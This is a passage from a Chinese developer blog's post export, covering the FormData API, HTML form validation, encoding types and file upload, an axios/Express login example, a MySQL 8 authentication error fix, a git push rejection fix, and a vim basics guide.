FormData()构造函数的参数是一个 DOM 的表单元素，构造函数会自动处理表单的键值对。这个参数是可选的，如果省略该参数，就表示一个空的表单。 下面是一个表单。 123456789101112131415&lt;form id=&quot;myForm&quot; name=&quot;myForm&quot;&gt; &lt;div&gt; &lt;label for=&quot;username&quot;&gt;用户名：&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;useracc&quot;&gt;账号：&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;useracc&quot; name=&quot;useracc&quot;&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;userfile&quot;&gt;上传文件：&lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;userfile&quot; name=&quot;userfile&quot;&gt; &lt;/div&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit!&quot;&gt;&lt;/form&gt; 我们用FormData()处理上面这个表单。 12345678910var myForm = document.getElementById(&#x27;myForm&#x27;);var formData = new FormData(myForm);// 获取某个控件的值formData.get(&#x27;username&#x27;) // &quot;&quot;// 设置某个控件的值formData.set(&#x27;username&#x27;, &#x27;张三&#x27;);formData.get(&#x27;username&#x27;) // &quot;张三&quot; 实例方法FormData 提供以下实例方法。 FormData.get(key)：获取指定键名对应的键值，参数为键名。如果有多个同名的键值对，则返回第一个键值对的键值。 FormData.getAll(key)：返回一个数组，表示指定键名对应的所有键值。如果有多个同名的键值对，数组会包含所有的键值。 FormData.set(key, value)：设置指定键名的键值，参数为键名。如果键名不存在，会添加这个键值对，否则会更新指定键名的键值。如果第二个参数是文件，还可以使用第三个参数，表示文件名。 FormData.delete(key)：删除一个键值对，参数为键名。 FormData.append(key, value)：添加一个键值对。如果键名重复，则会生成两个相同键名的键值对。如果第二个参数是文件，还可以使用第三个参数，表示文件名。 FormData.has(key)：返回一个布尔值，表示是否具有该键名的键值对。 FormData.keys()：返回一个遍历器对象，用于for...of循环遍历所有的键名。 FormData.values()：返回一个遍历器对象，用于for...of循环遍历所有的键值。 FormData.entries()：返回一个遍历器对象，用于for...of循环遍历所有的键值对。如果直接用for...of循环遍历 FormData 实例，默认就会调用这个方法。 下面是get()、getAll()、set()、append()方法的例子。 123456789var formData = new FormData();formData.set(&#x27;username&#x27;, &#x27;张三&#x27;);formData.append(&#x27;username&#x27;, &#x27;李四&#x27;);formData.get(&#x27;username&#x27;) // &quot;张三&quot;formData.getAll(&#x27;username&#x27;) // [&quot;张三&quot;, &quot;李四&quot;]formData.append(&#x27;userpic[]&#x27;, myFileInput.files[0], &#x27;user1.jpg&#x27;);formData.append(&#x27;userpic[]&#x27;, myFileInput.files[1], &#x27;user2.jpg&#x27;); 下面是遍历器的例子。 12345678910111213141516171819202122232425262728var formData = new FormData();formData.append(&#x27;key1&#x27;, &#x27;value1&#x27;);formData.append(&#x27;key2&#x27;, &#x27;value2&#x27;);for (var key of formData.keys()) &#123; console.log(key);&#125;// &quot;key1&quot;// &quot;key2&quot;for (var value of formData.values()) &#123; console.log(value);&#125;// &quot;value1&quot;// &quot;value2&quot;for (var pair of formData.entries()) &#123; console.log(pair[0] + &#x27;: &#x27; + pair[1]);&#125;// key1: value1// key2: value2// 等同于遍历 formData.entries()for (var pair of formData) &#123; console.log(pair[0] + &#x27;: &#x27; + pair[1]);&#125;// key1: value1// key2: value2 表单的内置验证自动校验表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。 1234567891011121314151617&lt;!-- 必填 --&gt;&lt;input required&gt;&lt;!-- 必须符合正则表达式 --&gt;&lt;input pattern=&quot;banana|cherry&quot;&gt;&lt;!-- 字符串长度必须为6个字符 --&gt;&lt;input minlength=&quot;6&quot; maxlength=&quot;6&quot;&gt;&lt;!-- 数值必须在1到10之间 --&gt;&lt;input type=&quot;number&quot; min=&quot;1&quot; max=&quot;10&quot;&gt;&lt;!-- 必须填入 Email 地址 --&gt;&lt;input type=&quot;email&quot;&gt;&lt;!-- 必须填入 URL --&gt;&lt;input type=&quot;URL&quot;&gt; 如果一个控件通过验证，它就会匹配:valid的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配:invalid的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。 1234567input:invalid &#123; border-color: red;&#125;input,input:valid &#123; border-color: #ccc;&#125; checkValidity()除了提交表单的时候，浏览器自动校验表单，还可以手动触发表单的校验。表单元素和表单控件都有checkValidity()方法，用于手动触发校验。 12345// 触发整个表单的校验form.checkValidity()// 触发单个表单控件的校验formControl.checkValidity() checkValidity()方法返回一个布尔值，true表示通过校验，false表示没有通过校验。因此，提交表单可以封装为下面的函数。 1234567function submitForm(action) &#123; var form = document.getElementById(&#x27;form&#x27;); form.action = action; if (form.checkValidity()) &#123; form.submit(); &#125;&#125; willValidate 属性控件元素的willValidate属性是一个布尔值，表示该控件是否会在提交时进行校验。 1234567// HTML 代码如下// &lt;form novalidate&gt;// &lt;input id=&quot;name&quot; name=&quot;name&quot; required /&gt;// &lt;/form&gt;var input = document.querySelector(&#x27;#name&#x27;);input.willValidate // true validationMessage 属性控件元素的validationMessage属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。 该控件不会在提交时自动校验 该控件满足校验条件 1234// HTML 代码如下// &lt;form&gt;&lt;input type=&quot;text&quot; required&gt;&lt;/form&gt;document.querySelector(&#x27;form input&#x27;).validationMessage// &quot;请填写此字段。&quot; 下面是另一个例子。 1234var myInput = document.getElementById(&#x27;myinput&#x27;);if (!myInput.checkValidity()) &#123; document.getElementById(&#x27;prompt&#x27;).innerHTML = myInput.validationMessage;&#125; setCustomValidity()控件元素的setCustomValidity()方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。 这个方法可以替换浏览器内置的表单验证报错信息，参数就是要显示的报错信息。 12345678910&lt;form action=&quot;somefile.php&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot; pattern=&quot;[a-z]&#123;1,15&#125;&quot; id=&quot;username&quot; &gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt; 上面的表单输入框，要求只能输入小写字母，且不得超过15个字符。如果输入不符合要求（比如输入“ABC”），提交表单的时候，Chrome 浏览器会弹出报错信息“Please match the requested format.”，禁止表单提交。下面使用setCustomValidity()方法替换掉报错信息。 123456var input = document.getElementById(&#x27;username&#x27;);input.oninvalid = function (event) &#123; event.target.setCustomValidity( &#x27;用户名必须是小写字母，不能为空，最长不超过15个字符&#x27; );&#125; 上面代码中，setCustomValidity()方法是在invalid事件的监听函数里面调用。该方法也可以直接调用，这时如果参数不为空字符串，浏览器就会认为该控件没有通过校验，就会立刻显示该方法设置的报错信息。 1234567891011121314151617181920/* HTML 代码如下&lt;form&gt; &lt;p&gt;&lt;input type=&quot;file&quot; id=&quot;fs&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt;&lt;/form&gt;*/document.getElementById(&#x27;fs&#x27;).onchange = checkFileSize;function checkFileSize() &#123; var fs = document.getElementById(&#x27;fs&#x27;); var files = fs.files; if (files.length &gt; 0) &#123; if (files[0].size &gt; 75 * 1024) &#123; fs.setCustomValidity(&#x27;文件不能大于 75KB&#x27;); return; &#125; &#125; fs.setCustomValidity(&#x27;&#x27;);&#125; 上面代码一旦发现文件大于 75KB，就会设置校验失败，同时给出自定义的报错信息。然后，点击提交按钮时，就会显示报错信息。这种校验失败是不会自动消除的，所以如果所有文件都符合条件，要将报错信息设为空字符串，手动消除校验失败的状态。 validity 属性控件元素的属性validity属性返回一个ValidityState对象，包含当前校验状态的信息。 该对象有以下属性，全部为只读属性。 ValidityState.badInput：布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。 ValidityState.customError：布尔值，表示是否已经调用setCustomValidity()方法，将校验信息设置为一个非空字符串。 ValidityState.patternMismatch：布尔值，表示用户输入的值是否不满足模式的要求。 ValidityState.rangeOverflow：布尔值，表示用户输入的值是否大于最大范围。 ValidityState.rangeUnderflow：布尔值，表示用户输入的值是否小于最小范围。 ValidityState.stepMismatch：布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。 ValidityState.tooLong：布尔值，表示用户输入的字数超出了最长字数。 ValidityState.tooShort：布尔值，表示用户输入的字符少于最短字数。 ValidityState.typeMismatch：布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。 ValidityState.valid：布尔值，表示用户是否满足所有校验条件。 ValidityState.valueMissing：布尔值，表示用户没有填入必填的值。 下面是一个例子。 123456var input = document.getElementById(&#x27;myinput&#x27;);if (input.validity.valid) &#123; console.log(&#x27;通过校验&#x27;);&#125; else &#123; console.log(&#x27;校验失败&#x27;);&#125; 下面是另外一个例子。 12345var txt = &#x27;&#x27;;if (document.getElementById(&#x27;myInput&#x27;).validity.rangeOverflow) &#123; txt = &#x27;数值超过上限&#x27;;&#125;document.getElementById(&#x27;prompt&#x27;).innerHTML = txt; 如果想禁止浏览器弹出表单验证的报错信息，可以监听invalid事件。 123456789101112131415161718192021222324var input = document.getElementById(&#x27;username&#x27;);var form = document.getElementById(&#x27;form&#x27;);var elem = document.createElement(&#x27;div&#x27;);elem.id = &#x27;notify&#x27;;elem.style.display = &#x27;none&#x27;;form.appendChild(elem);input.addEventListener(&#x27;invalid&#x27;, function (event) &#123; event.preventDefault(); if (!event.target.validity.valid) &#123; elem.textContent = &#x27;用户名必须是小写字母&#x27;; elem.className = &#x27;error&#x27;; elem.style.display = &#x27;block&#x27;; input.className = &#x27;invalid animated shake&#x27;; &#125;&#125;);input.addEventListener(&#x27;input&#x27;, function(event)&#123; if ( &#x27;block&#x27; === elem.style.display ) &#123; input.className = &#x27;&#x27;; elem.style.display = &#x27;none&#x27;; &#125;&#125;); 上面代码中，一旦发生invalid事件（表单验证失败），event.preventDefault()用来禁止浏览器弹出默认的验证失败提示，然后设置定制的报错提示框。 表单的 novalidate 属性表单元素的 HTML 属性novalidate，可以关闭浏览器的自动校验。 12&lt;form novalidate&gt;&lt;/form&gt; 这个属性也可以在脚本里设置。 1form.noValidate = true; 如果表单元素没有设置novalidate属性，那么提交按钮（&lt;button&gt;或&lt;input&gt;元素）的formnovalidate属性也有同样的作用。 123&lt;form&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; formnovalidate&gt;&lt;/form&gt; enctype 属性表单能够用四种编码，向服务器发送数据。编码格式由表单的enctype属性决定。 假定表单有两个字段，分别是foo和baz，其中foo字段的值等于bar，baz字段的值是一个分为两行的字符串。 12The first line.The second line. 下面四种格式，都可以将这个表单发送到服务器。 （1）GET 方法 如果表单使用GET方法发送数据，enctype属性无效。 123456&lt;form action=&quot;register.php&quot; method=&quot;get&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 数据将以 URL 的查询字符串发出。 1?foo=bar&amp;baz=The%20first%20line.%0AThe%20second%20line. （2）application/x-www-form-urlencoded 如果表单用POST方法发送数据，并省略enctype属性，那么数据以application/x-www-form-urlencoded格式发送（因为这是默认值）。 123456&lt;form action=&quot;register.php&quot; method=&quot;post&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 发送的 HTTP 请求如下。 123Content-Type: application/x-www-form-urlencodedfoo=bar&amp;baz=The+first+line.%0D%0AThe+second+line.%0D%0A 上面代码中，数据体里面的%0D%0A代表换行符（\\r\\n）。 （3）text/plain 如果表单使用POST方法发送数据，enctype属性为text/plain，那么数据将以纯文本格式发送。 1234567&lt;form action=&quot;register.php&quot; method=&quot;post&quot; enctype=&quot;text/plain&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 发送的 HTTP 请求如下。 12345Content-Type: text/plainfoo=barbaz=The first line.The second line. （4）multipart/form-data 如果表单使用POST方法，enctype属性为multipart/form-data，那么数据将以混合的格式发送。 1234567&lt;form action=&quot;register.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 发送的 HTTP 请求如下。 12345678910111213Content-Type: multipart/form-data; boundary=---------------------------314911788813839-----------------------------314911788813839Content-Disposition: form-data; name=&quot;foo&quot;bar-----------------------------314911788813839Content-Disposition: form-data; name=&quot;baz&quot;The first line.The second line.-----------------------------314911788813839-- 这种格式也是文件上传的格式。 文件上传用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。 1&lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;myFile&quot;&gt; 此外，还需要将表单&lt;form&gt;元素的method属性设为POST，enctype属性设为multipart/form-data。其中，enctype属性决定了 HTTP 头信息的Content-Type字段的值，默认情况下这个字段的值是application/x-www-form-urlencoded，但是文件上传的时候要改成multipart/form-data。 123456789&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div&gt; &lt;label for=&quot;file&quot;&gt;选择一个文件&lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;myFile&quot; multiple&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit_button&quot; value=&quot;上传&quot; /&gt; &lt;/div&gt;&lt;/form&gt; 上面的 HTML 代码中，file 控件的multiple属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。 12var fileSelect = document.getElementById(&#x27;file&#x27;);var files = fileSelect.files; 然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。 123456789101112var formData = new FormData();for (var i = 0; i &lt; files.length; i++) &#123; var file = files[i]; // 只上传图片文件 if (!file.type.match(&#x27;image.*&#x27;)) &#123; continue; &#125; formData.append(&#x27;photos[]&#x27;, file, file.name);&#125; 最后，使用 Ajax 向服务器上传文件。 1234567891011var xhr = new XMLHttpRequest();xhr.open(&#x27;POST&#x27;, &#x27;handler.php&#x27;, true);xhr.onload = function () &#123; if (xhr.status !== 200) &#123; console.log(&#x27;An error occurred!&#x27;); &#125;&#125;;xhr.send(formData); 除了发送 FormData 实例，也可以直接 AJAX 发送文件。 123456var file = document.getElementById(&#x27;test-input&#x27;).files[0];var xhr = new XMLHttpRequest();xhr.open(&#x27;POST&#x27;, &#x27;myserver/uploads&#x27;);xhr.setRequestHeader(&#x27;Content-Type&#x27;, file.type);xhr.send(file); 参考链接 HTML5 Form Validation With the “pattern” Attribute, Thoriq Firdaus","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"HTML5","slug":"Node/HTML5","permalink":"https://coloey.github.io/categories/Node/HTML5/"}],"tags":[]},{"title":"axios发送请求时后台接收的req.body为空","slug":"axios发送请求时后台接收的req-body为空","date":"2022-03-21T01:47:50.000Z","updated":"2022-03-21T03:12:20.438Z","comments":true,"path":"2022/03/21/axios发送请求时后台接收的req-body为空/","link":"","permalink":"https://coloey.github.io/2022/03/21/axios%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E6%97%B6%E5%90%8E%E5%8F%B0%E6%8E%A5%E6%94%B6%E7%9A%84req-body%E4%B8%BA%E7%A9%BA/","excerpt":"","text":"首先，先了解一下关于http协议里定义的四种常见数据的post方法，分别是：application/www-form-ulrencodedmultipart/form-dataapplication/jsontext/xml Express依赖bodyParser对请求的包体进行解析。默认支持application/json,application/www-form-urlencoded,multipart/form-data.单数对xml没有支持。需要自己代码来实现 用axios post请求提交数据的时候需要清楚发送请求的类型是哪种，后台用相应的方法解析 1 使用FormData提交表单数据 坑一：使用FormData时一定要在先绑定submit事件，在submit事件触发时发送axios post请求,否则获取不到formData里面的值 坑二:axios请求里面如果直接使用data:formData，浏览器会自动帮我们加上 Content-Type: multipart/form-data ，因此请求要这样设置： 123456789101112131415var form = document.getElementById(&quot;myForm&quot;); // 用表单来初始化 var formData = new FormData(form); // 我们可以根据name来访问表单中的字段 var username = formData.get(&quot;username&quot;); // 获取名字 var password = formData.get(&quot;password&quot;); // 获取密码 axios(&#123; method:&quot;post&quot;, url:&#x27;http://127.0.0.1/api/login&#x27;, data:&#123; username:username, password:password &#125; &#125;) 这样默认Content-type：application/json, 如果表单属性过多，可以先用一个对象接收： 123456789101112131415var form = document.getElementById(&quot;myForm&quot;); // 用表单来初始化 var formData = new FormData(form); // 我们可以根据name来访问表单中的字段 let myFormData=&#123;&#125;; //如果表单属性过多可以先遍历 for(let pair of formData.entries())&#123; myFormData[pair[0]]=pair[1]; &#125; axios(&#123; method:&quot;post&quot;, url:&#x27;http://127.0.0.1/api/login&#x27;, data:myFormData &#125;) 后台接收使用中间件body-parser解析表单体数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960const express=require(&#x27;express&#x27;);const session=require(&#x27;express-session&#x27;);const cors=require(&#x27;cors&#x27;);const bodyParser=require(&#x27;body-parser&#x27;)const app=express();app.use(cors());app.use( session(&#123; secret:&#x27;xiaoqi&#x27;, resave:false, saveUninitialized:true &#125;))//托管静态页面app.use(express.static(&#x27;./pages&#x27;));//自定义解析Post提交过来的表单数据app.use(bodyParser.urlencoded(&#123;extended:false&#125;))app.use(bodyParser.json())//登录API接口app.post(&#x27;/api/login&#x27;,(req,res)=&gt;&#123; //判断用户提交的登录信息是否正确 //console.log(req.body) if(req.body.username!==&quot;admin&quot;||req.body.password!==&quot;888888&quot;)&#123; return res.send(&#123;status:1,msg:&#x27;登录失败&#x27;&#125;) &#125; //登录成功则把信息存储在Session中 console.log(req.body); req.session.user=req.body;//用户登录信息 req.session.islogin=true;//用户登录状态 res.send(&#123;status:0,msg:&#x27;登录成功&#x27;&#125;)&#125;)//获取用户姓名的接口app.get(&#x27;/api/username&#x27;,(req,res)=&gt;&#123; //从Session中获取用户姓名响应给客户端 if(!req.session.islogin)&#123; return res.send(&#123;status:1,msg:&#x27;fail&#x27;&#125;) &#125; res.send(&#123; status:0, msg:&#x27;success&#x27;, username:req.session.user.username, &#125;)&#125;)//退出登录的接口app.post(&#x27;/api/logout&#x27;,(req,res)=&gt;&#123; //清空当前客户端的session信息 req.session.destroy() res.send(&#123; status:0, msg:&#x27;退出登录成功&#x27; &#125;)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;)","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"node连接MySql报错ER_NOT_SUPPORTED_AUTH_MODE","slug":"node连接MySql报错ER-NOT-SUPPORTED-AUTH-MODE","date":"2022-03-20T05:28:16.000Z","updated":"2022-03-20T05:33:56.881Z","comments":true,"path":"2022/03/20/node连接MySql报错ER-NOT-SUPPORTED-AUTH-MODE/","link":"","permalink":"https://coloey.github.io/2022/03/20/node%E8%BF%9E%E6%8E%A5MySql%E6%8A%A5%E9%94%99ER-NOT-SUPPORTED-AUTH-MODE/","excerpt":"","text":"报错信息本人系统安装的是mysql-installer-community-8.0.18.0.msi这个版本，然后我本地使用node-mysql去连接数据库。 123456789101112131415const mysql=require(&#x27;mysql&#x27;)//建立MYSQL与数据库的联系const db=mysql.createPool(&#123; host:&#x27;127.0.0.1&#x27;,//数据库的ip地址 user:&#x27;root&#x27;, password:&#x27;123456&#x27;, database:&#x27;my_db_01&#x27;,//指定要操作哪个数据库&#125;)//测试mysql能否正常工作db.query(&#x27;select 1&#x27;,(err,result)=&gt;&#123; //mysql工作期间报错 if(err)return console.log(err.message) //能成功执行SQL语句 console.log(result);&#125;) 运行db.js 12PS D:\\Vue-chat\\Server&gt; node db.jsER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested by server; consider upgrading MySQL client 报错原因mysql8.0以上加密方式，Node还不支持。 解决第一步谷歌查到了 https://stackoverflow.com/questions/50093144/mysql-8-0-client-does-not-support-authentication-protocol-requested-by-server这个答案，和我报错的步骤基本一样，按照这个进行操作，登录MySql Command Line Client使用这个 12345mysql&gt; alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified with mysql_native_password by &#x27;123456&#x27;;Query OK, 0 rows affected (0.27 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.08 sec)","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"git遇到的坑","slug":"git遇到的坑","date":"2022-03-18T13:44:59.000Z","updated":"2022-03-18T13:45:30.601Z","comments":true,"path":"2022/03/18/git遇到的坑/","link":"","permalink":"https://coloey.github.io/2022/03/18/git%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/","excerpt":"","text":"解决用git push origin master时出现的问题不知道小伙伴们在使用git push origin master时有没有遇到下面的问题，今天我遇到了，原因一般是相同的，下面详细分析一下 报错内容：To github.com:/! [rejected] master -&gt; master (non-fast-forward)error: failed to push some refs to ‘&#x67;&#105;&#116;&#x40;&#103;&#x69;&#x74;&#x68;&#x75;&#x62;&#46;&#99;&#111;&#x6d;:***/***’hint: Updates were rejected because the tip of your current branch is behindhint: its remote counterpart. Integrate the remote changes (e.g.hint: ‘git pull …’) before pushing again.hint: See the ‘Note about fast-forwards’ in ‘git push –help’ for details. 大致翻译为：错误：无法将一些引用推送到’&#103;&#105;&#116;&#x40;&#103;&#x69;&#116;&#104;&#x75;&#x62;&#x2e;&#x63;&#111;&#x6d;：****** / Demo.git’提示：由于当前分支的尖端位于其远程对应的后面，因此更新被拒绝。 合并远程更改（例如’git pull’），然后再次推送。 有关详细信息，请参见“ git push –help”中的“关于fast-forwards的注意事项”。 这个报错的原因是因为远程repository和本地的repository有冲突，下面有3种解决办法： 按上面报错内容中所给的提示先用git pull之后再用git push$ git pull origin master$ git push origin master 使用强制push的方法，但是这会使远程修改丢失，一般是不可取的，尤其是多人协作开发的时候$ git push origin master -f 如果不想merge远程和本地修改，可以先创建新的分支，然后再push$ git branch [name]$ git push origin [name]","categories":[{"name":"git","slug":"git","permalink":"https://coloey.github.io/categories/git/"}],"tags":[]},{"title":"vim","slug":"vim","date":"2022-03-18T13:42:38.000Z","updated":"2022-03-18T13:43:36.735Z","comments":true,"path":"2022/03/18/vim/","link":"","permalink":"https://coloey.github.io/2022/03/18/vim/","excerpt":"","text":"Vim可以分为三种模式，分别为： 命令行模式（Command mode） 插入模式（Insert mode） 底行模式（Lastline mode） 命令行模式 控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。 插入模式 只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。 底行模式 将文件保存或退出vim，也可以设置编辑环境，如寻找字符串、列出行号……等。 不过，一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。 5. Vim的基本操作a) 进入Vim 在系统光标提示符后，输入vim及文件名后，回车，进入Vim编辑画面。 特别注意，进入vim之后，是处于「命令行模式（command mode）」，要切换到「插入模式（Insert mode）」才能够输入文字。 b) 切换至插入模式（Insert mode）编辑文件 在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。 c) 插入模式（Insert mode）切换到命令行模式（Command mode） 在插入模式下，按一下「ESC」键即可。 d) 退出vim及保存文件 在命令行模式（Command mode）下，按冒号「:」键，进入底行模式（Last Line mode） 常见底行模式下的命令行： :w filename 文件以filename为文件名保存 :wq 文件存盘并退出vim :q 文件不存盘并退出vim :q! 文件不存盘强制退出vim 6. 命令行模式下的功能键（部分）a) 从命令行模式切换为插入模式的三种方式 「 i 」：从当前光标位置进入插入模式 「 a 」：从当前光标位置的下一个字符进入插入模式 「 o 」：从当前光标位置的下一行进入插入模式 b) 从插入模式切换为命令行模式 按「ESC」键 c) 移动光标 vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。 d) 行尾追加 不管光标在该行的什么位置，直接按大写字母「A」即可 e) 删除单词 dw：把光标停留在需要删除的单词前面，依次按下「d」「w」，即可 de：把光标停留在需要删除的单词前面（无视单词前面的空格），依次按下「d」「e」，即可 f) 从当前光标处删除到行末 把光标停留在需要删除的句子前面，依次按下「d」「$」，即可 g) 快速跳转到行首 按下数字「0」，即可 h) 使用计数以删除单词 示例：this ABC DE line FGHI JK LMN OP of words is Q RS TUV cleaned up. 依次将鼠标定位到ABC前，按「d」「2」「w」，可以删除：ABC DE 将鼠标定位到FGHI前，按「d」「4」「w」，可以删除：FGHI JK LMN OP 将鼠标定位到Q前，按「d」「3」「w」，可以删除：Q RS TUV 得到句子： this line of words is cleaned up. i) 删除当前行 鉴于删除当前行这一操作的高频性，vim设计者简化了快捷键，按「d」「d」即可。 连续删除两行，从当前行开始，则为：「2」「d」「d」 j) 撤销更改 a. 按小写字母「u」，撤销上一步的更改操作； b. 按大写字母「U」，撤销整行的更改操作； c. 「Ctrl+R」撤销上一步「撤销操作」。 k) 将刚删除的内容置入其他行 之前刚刚删除的内容，会放入Vim编辑器的寄存器中。基于如此原理，可以将之认为成Windows操作系统的「剪切」操作。 先在想删除的行，按「d」「d」，进行删除操作； 再在想插入那行的前一行按「p」键即可。 l) 替换 将光标放到需要改的字符前，先按「r」键，再输入想更改的字符即可。 m) 跳转 顶部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入「g」「g」即可； 底部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入大写字母「g」即可； 特定行跳转命令：直接输入行号，然后输入大写字母「g」即可。 n) 查找命令 字符串查找： 输入英文斜杠「/」，后面紧接需要搜索的字符串即可。 查找下一个相同字符串，就紧接着按小写字母「n」； 查找上一个相同字符串，就紧接着按大写字母「N」。 配对括号查找： 在编程语言里，配对括号「 ( 」「 ) 」「 { 」「 } 」很常见，当定位到一个配对括号的一半时（注意光标要定位在该括号之前），按「%」，即可自动跳转到与之匹配的第一个配对括号处。 o) 替换字符串 当前行替换命令 在标准命令行模式下，光标定位到当前行，按英文冒号「 ：」，再输入s/oldstring/newstring/g 回车，即可。 完整语句为： :s/dogg/dog/g 特定几行替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入#,#s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： ***:*5,8s/dogg/dog/g 全文替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/g 全文替换命令（每个匹配项替换前需确认） 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/gc 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/gc 作者：饥人谷_李维超链接：https://www.jianshu.com/p/8b679b35c9d5来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。Vim可以分为三种模式，分别为： 命令行模式（Command mode） 插入模式（Insert mode） 底行模式（Lastline mode） 命令行模式 控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。 插入模式 只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。 底行模式 将文件保存或退出vim，也可以设置编辑环境，如寻找字符串、列出行号……等。 不过，一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。 5. Vim的基本操作a) 进入Vim 在系统光标提示符后，输入vim及文件名后，回车，进入Vim编辑画面。 特别注意，进入vim之后，是处于「命令行模式（command mode）」，要切换到「插入模式（Insert mode）」才能够输入文字。 b) 切换至插入模式（Insert mode）编辑文件 在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。 c) 插入模式（Insert mode）切换到命令行模式（Command mode） 在插入模式下，按一下「ESC」键即可。 d) 退出vim及保存文件 在命令行模式（Command mode）下，按冒号「:」键，进入底行模式（Last Line mode） 常见底行模式下的命令行： :w filename 文件以filename为文件名保存 :wq 文件存盘并退出vim :q 文件不存盘并退出vim :q! 文件不存盘强制退出vim 6. 命令行模式下的功能键（部分）a) 从命令行模式切换为插入模式的三种方式 「 i 」：从当前光标位置进入插入模式 「 a 」：从当前光标位置的下一个字符进入插入模式 「 o 」：从当前光标位置的下一行进入插入模式 b) 从插入模式切换为命令行模式 按「ESC」键 c) 移动光标 vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。 d) 行尾追加 不管光标在该行的什么位置，直接按大写字母「A」即可 e) 删除单词 dw：把光标停留在需要删除的单词前面，依次按下「d」「w」，即可 de：把光标停留在需要删除的单词前面（无视单词前面的空格），依次按下「d」「e」，即可 f) 从当前光标处删除到行末 把光标停留在需要删除的句子前面，依次按下「d」「$」，即可 g) 快速跳转到行首 按下数字「0」，即可 h) 使用计数以删除单词 示例：this ABC DE line FGHI JK LMN OP of words is Q RS TUV cleaned up. 依次将鼠标定位到ABC前，按「d」「2」「w」，可以删除：ABC DE 将鼠标定位到FGHI前，按「d」「4」「w」，可以删除：FGHI JK LMN OP 将鼠标定位到Q前，按「d」「3」「w」，可以删除：Q RS TUV 得到句子： this line of words is cleaned up. i) 删除当前行 鉴于删除当前行这一操作的高频性，vim设计者简化了快捷键，按「d」「d」即可。 连续删除两行，从当前行开始，则为：「2」「d」「d」 j) 撤销更改 a. 按小写字母「u」，撤销上一步的更改操作； b. 按大写字母「U」，撤销整行的更改操作； c. 「Ctrl+R」撤销上一步「撤销操作」。 k) 将刚删除的内容置入其他行 